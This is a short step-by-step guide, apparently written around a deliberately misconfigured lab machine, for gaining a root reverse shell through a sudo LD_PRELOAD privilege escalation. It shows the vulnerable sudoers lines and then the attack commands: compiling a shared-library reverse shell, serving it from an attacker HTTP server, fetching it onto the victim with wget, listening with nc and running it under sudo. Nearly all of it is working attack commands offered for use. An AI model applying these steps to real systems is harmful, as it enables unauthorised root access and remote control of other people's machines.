# Reverse Shell Execution Guide

This guide outlines the steps to prepare and execute a reverse shell attack. Follow these instructions carefully.

## Preparation

1. **Edit Sudoers File:**

   - Run `sudo visudo`.
   - Add the following line:
     ```
     slab ALL=(ALL:ALL) NOPASSWD: /home/slab/script.sh
     ```
   - Include this line as well:
     ```
     Defaults:slab env_keep+="*"
     ```

2. **Set File Permissions:**
   - Change the ownership of `script.sh`:
     ```
     sudo chown root:root ./script.sh
     ```
   - Set the appropriate permissions:
     ```
     sudo chmod 600 ./script.sh
     ```

## Execution

1. **Check Sudo Privileges:**

   - After gaining access, run `sudo -l` to see what commands you can execute with sudo.

2. **Compile Reverse Shell:**

   - Remember to compile the reverse shell on the same type of platform as the target.
   - Compile it as shared library like the following

   ```
   gcc -fPIC -shared -o ./reverseshell.so ./reverseshell.c -nostartfiles
   ```

3. **Setup Attack Infrastructure:**

   - On the attacker's machine, run a HTTP server:
     ```
     python3 -m http.server 9000
     ```
   - Fetch the binary on the victim's machine:
     ```
     wget ipaddress:9000/reverseshell.so
     ```
   - Listen for incoming connections on the attacker's machine:
     ```
     nc -lvnp 6000
     ```

4. **Execute the Reverse Shell:**
   - Run the following command on the victim's machine:
     ```
     sudo LD_PRELOAD=./reverseshell.so ./script.sh
     ```

After completing these steps, you should have a reverse shell on the target machine.
